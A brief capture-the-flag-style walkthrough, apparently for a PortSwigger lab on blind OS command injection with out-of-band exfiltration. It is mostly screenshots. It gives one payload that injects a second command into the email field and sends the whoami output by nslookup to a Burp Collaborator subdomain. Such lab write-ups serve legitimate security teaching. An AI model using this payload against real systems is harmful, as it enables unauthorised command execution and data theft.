## Question:

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/69dc9d88-9187-4637-a2bb-6972b1cec0bf)

## Solution:

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/713ed8a9-59f7-4b04-8e4c-3e1adc420ac8)

Modify the email parameter, changing it we know that is vulnerable to Blind Command injection. so we need to use whoami to extract the data so the payload will be.

email=`||nslookup+whoami.BURP-COLLABORATOR-SUBDOMAIN||`

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/28d3d57c-7040-4cb2-896e-1d81fabbc9a3)

Then go to Burp Collaborator press poll now.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/01ca6368-38d1-44bb-a50c-c144e1b4a0f6)

We get the username in the details panel - `peter-t5P0RK`

Then go to the home page and click on submit solution.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/51896575-bef2-4c35-8b55-e891b73c58e6)

Lab Solved

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/bdf6ef1f-2dbf-447a-acc1-0d8eaeb4bc9a)
